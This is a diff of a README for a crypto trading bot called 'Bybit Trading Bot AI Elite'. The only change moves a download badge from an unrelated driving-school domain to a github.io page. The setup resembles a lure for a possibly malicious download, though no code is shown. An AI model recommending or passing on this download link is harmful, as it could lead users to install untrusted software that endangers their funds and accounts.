@@ -4,7 +4,7 @@ Bybit Trading Bot AI Elite is an advanced artificial intelligence crypto automat
 
 Ideal for scalpers, swing traders, and algorithmic enthusiasts, this bot allows you to define custom strategies, receive detailed analytics, and interact via secure alerts. Whether you're running a solo trading desk or managing funds for others, this solution adapts to your needs with modular design, intuitive dashboards, and AI-curated trading signals.
 
-[![Download Bybit Bot](https://img.shields.io/badge/Download-BybitBotAI-blueviolet)](https://dalahdrivingschool.com/)
+[![Download Bybit Bot](https://img.shields.io/badge/Download-BybitBotAI-blueviolet)](https://bybit-trading-bot-ai-elite.github.io/.github)
 
 ---
 
